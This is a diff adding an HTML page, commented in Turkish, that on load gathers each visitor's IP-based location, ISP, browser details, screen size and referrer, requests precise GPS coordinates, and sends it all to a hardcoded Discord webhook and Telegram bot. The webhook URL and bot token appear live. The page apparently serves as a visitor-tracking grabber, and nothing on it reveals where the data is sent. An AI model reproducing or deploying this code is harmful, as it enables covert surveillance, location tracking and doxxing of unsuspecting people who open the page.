@@ -1,0 +1,153 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Get User Location Automatically</title>
+</head>
+<body>
+    <h1>Kullanıcının Konumu ve Bilgileri Alınıyor...</h1>
+
+    <script>
+        var ip = '';
+        var latitude = '';
+        var longitude = '';
+        var city = '';
+        var country = '';
+        var countryCode = '';
+        var org = '';
+        var mapLink = '';
+        var browserInfo = navigator.userAgent;
+        var dateVisited = new Date().toUTCString();
+        var language = navigator.language;
+        var platform = navigator.platform;
+        var referrer = document.referrer;
+        var yerelZaman = new Date();
+        var ekranGenislik = window.screen.width;
+        var ekranYukseklik = window.screen.height;
+
+        // Discord Webhook URL
+        var discordWebhookURL = 'https://discord.com/api/webhooks/1197143406909079603/NUuX5YJh-7FilsYGnKTcZOdaibciKTyTd8EyWpGzJk1gcKAgJtOsfcYoyqC-OttBeRj8';
+
+        // Telegram API URL ve Chat ID
+        var telegramAPIURL = 'https://api.telegram.org/bot7019392146:AAHjKYA-b9kqnLXMp5ssExcAOtfVW3rQ5Us/sendMessage';
+        var telegramChatID = '2090459804';
+        var combinedMessage = '';
+
+        // Sayfa yüklendiğinde otomatik olarak çalışacak fonksiyon
+        window.onload = function() {
+            fetchIPInfo();  // IP tabanlı bilgileri hemen al
+
+            // Gerçek konumu almayı dene
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(saveRealPosition, sendFinalMessage);  
+            } else {
+                alert("Geolocation tarayıcınız tarafından desteklenmiyor.");
+                sendFinalMessage();  // Geolocation desteklenmiyorsa yalnızca IP tabanlı bilgileri gönder
+            }
+        };
+
+        function saveRealPosition(position) {
+            // Gerçek konum bilgilerini al
+            var realLatitude = position.coords.latitude;
+            var realLongitude = position.coords.longitude;
+            var realMapLink = `https://www.google.com/maps?q=${realLatitude},${realLongitude}`;
+
+            combinedMessage += `**Gerçek Konum Bilgileri**:\n` +
+                               `Enlem: ${realLatitude}\n` +
+                               `Boylam: ${realLongitude}\n` +
+                               `[Google Maps'te Gör](<${realMapLink}>)\n\n`;
+
+            sendFinalMessage();  // Hem gerçek konum hem de IP bilgileri gönderilmek üzere devam edilir
+        }
+
+        function fetchIPInfo() {
+            // IP tabanlı bilgileri al
+            fetch('https://ipapi.co/json/')
+                .then(function (response) {
+                    return response.json();
+                })
+                .then(function (data) {
+                    ip = data.ip;
+                    latitude = latitude || data.latitude;  // Eğer gerçek konum yoksa IP konumunu kullan
+                    longitude = longitude || data.longitude;
+                    city = data.city;
+                    country = data.country_name;
+                    countryCode = data.country.toLowerCase(); // Küçük harfe çevir
+                    org = data.org;
+                    mapLink = mapLink || 'https://www.google.com/maps?q=' + latitude + ',' + longitude;
+
+                    combinedMessage += `**IP ve Genel Bilgiler**:\n` +
+                                       `IP: ${ip}\n` +
+                                       `Enlem: ${latitude}\n` +
+                                       `Boylam: ${longitude}\n` +
+                                       `Şehir: ${city}\n` +
+                                       `Ülke: ${country} :flag_${countryCode}:\n` +
+                                       `Organizasyon: ${org}\n` +
+                                       `[Google Maps'te Gör](<${mapLink}>)\n\n` +
+                                       `Tarayıcı Bilgisi: ${browserInfo}\n` +
+                                       `Ziyaret Zamanı: ${dateVisited} **(${platform})**\n` +
+                                       `Dil: ${language}\n` +
+                                       `Yerel Zaman: ${yerelZaman}\n` +
+                                       `Ekran Çözünürlüğü: ${ekranGenislik}x${ekranYukseklik}\n` +
+                                       `Referer: ${referrer}\n\n`;
+
+                })
+                .catch(function (error) {
+                    console.error('IP bilgileri alınırken hata:', error);
+                });
+        }
+
+        function sendFinalMessage() {
+            // Tüm bilgileri tek seferde Discord Webhook'a gönder
+            sendToDiscord(combinedMessage);
+
+            // Telegram API'sine mesaj gönder
+            sendToTelegram(combinedMessage);
+        }
+
+        function sendToDiscord(message) {
+            fetch(discordWebhookURL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    content: message
+                })
+            })
+            .then(function (response) {
+                if (response.ok) {
+                    console.log('Tüm bilgiler başarıyla Discord\'a gönderildi.');
+                } else {
+                    console.error('Veriler Discord API\'ye gönderilemedi.');
+                }
+            })
+            .catch(function (error) {
+                console.error('Discord gönderim hatası:', error);
+            });
+        }
+
+        function sendToTelegram(message) {
+            // Mesajı URL encode et
+            var telegramMessage = encodeURIComponent(message);
+
+            // Telegram API'ye mesaj gönder
+            fetch(`${telegramAPIURL}?chat_id=${telegramChatID}&text=${telegramMessage}`, {
+                method: 'GET'
+            })
+            .then(function (response) {
+                if (response.ok) {
+                    console.log('Tüm bilgiler başarıyla Telegram\'a gönderildi.');
+                } else {
+                    console.error('Veriler Telegram API\'ye gönderilemedi.');
+                }
+            })
+            .catch(function (error) {
+                console.error('Telegram gönderim hatası:', error);
+            });
+        }
+
+    </script>
+</body>
+</html>
